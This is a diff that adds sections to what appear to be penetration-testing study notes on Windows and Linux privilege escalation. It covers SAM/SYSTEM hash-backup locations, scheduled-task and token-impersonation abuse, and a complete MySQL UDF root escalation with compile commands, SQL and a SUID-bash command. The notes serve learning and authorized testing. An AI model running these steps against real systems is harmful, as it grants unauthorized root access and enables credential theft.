@@ -124,6 +124,7 @@ For a more detailed windows privilege escalation methodology: [Windows-PrivEsc-G
     - Description: 
         - SAM and SYSTEM files stores user credential hashes and their encryption keys respectively
         - if we can extract those files (usually from backup locations, since normally those files are locked) we can crack user credential hashes
+        - backup locations we can look for : `C:\Windows\System32\config\RegBack` or `C:\Windows\repair`
     - Requirements: 
         - backup of SAM and SYSTEM files must be available and readable to be copied to a remote host for hash cracking 
     - Related instructions: 
@@ -149,10 +150,92 @@ For a more detailed windows privilege escalation methodology: [Windows-PrivEsc-G
 
 ### Scheduled Tasks
 
+- Description: If we are able to find a scheduled task that is running as admin/system priv, and if we can write or append to it, we can have our commands run elevated
+    - to check for current user scheduled tasks (this will also include microsoft scheduled tasks running as current user) : `schtasks /query /fo LIST /v`
+        - `/fo` is format output
+        - `/v` is verbose mode
+    - note that this is not the best way to enumerate scheduled tasks, and that there are no easy way to enumerate them
+        - look for clues inside:  
+            - interesting directories: `C:\` `C:\Users\user` `C:\Program Files` etc...
+- Requirements: 
+    - scheduled task time condition (is it possible to elevate with the time given?)
+    - write or append access to the script running as scheduled task
+    
+
 ### Applications and Programs
+
+- Description: like scheduled tasks, look inside interesting directories, find unrecognize programs, and searchploit to see if they are vulnerable
+- Requirements: 
+    - the application needs to be running as administrator or system, check with: `tasklist \v | findstr <program-name>`
+    - if its a gui app, we **have to** have RDP access or physical access to exploit this condition
 
 ### Token Abuse
 
+***For more detailed explanation of all potato exploits:*** 
+[potato exploits explanation](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
+
+- Descriptions : Service accounts by Windows core functionality can impersonate as other accounts in order to do service specific tasks, if we are exploiting a service and achieved RCE, we can impersonate admin's token to launch a separate processing using that token
+- Requirements : 
+    - must have `SeImpersonatePrivilege` on
+    - must have SMB (Hot potato) or RPC (Juicy and Rogue) services on for exploits. 
+    
+    
 # Linux Methodology 
 
+
+### Service Exploits
+- Description: If a service is running as root, `ps -ef | grep root` and is vulnerable to exploits, we can get root simply by exploiting the service
+    - *ie* Exploiting mysql service: if we can obtain admin/root credentials, and mysql is running `root` instead of `mysql`, we can apply User Defined Functions to run system commands
+        - in order to get UDF, we need to upload a shared-object file to a specific folder that mysql looks when executing UDFs
+            - The share object file needs to be compiled, its source contains the `system()` call
+        - then we need to execute the following command using the UDF function inside a mysql instance that is running as root
+            - `cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash`
+        - next, exit out of mysql, and execute the bash with preserved privlege `/tmp/rootbash -p`
+        
+```
+# compiling the share object file for UDF
+# note the -fPIC flag is necessary for x64 systems
+
+gcc -g -c raptor_udf2.c -fPIC
+gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+```
+
+```
+# mysql commands to create the UDF
+use mysql;
+create table foo(line blob);
+insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
+select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+create function do_system returns integer soname 'raptor_udf2.so';
+
+```
+
+
+- Requirement: 
+    - service must be running as root
+    - must have root access to the service aka able to login using: `mysql -uroot`
+    
+- Related instructions: 
+    - once the UDF is created, we can execute system commands using: `select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`
+        - note that do_system is the UDF function name created in mysql, and the shared object file is used for this function execution
+
+### Weak File Permissions
+
+
+### Sudo
+
+
+### SUID/GUID
+
+
+### Cronjobs
+
+
+### Password & Keys
+
+
+### NFS
+
+
+### Kernel Exploits
 
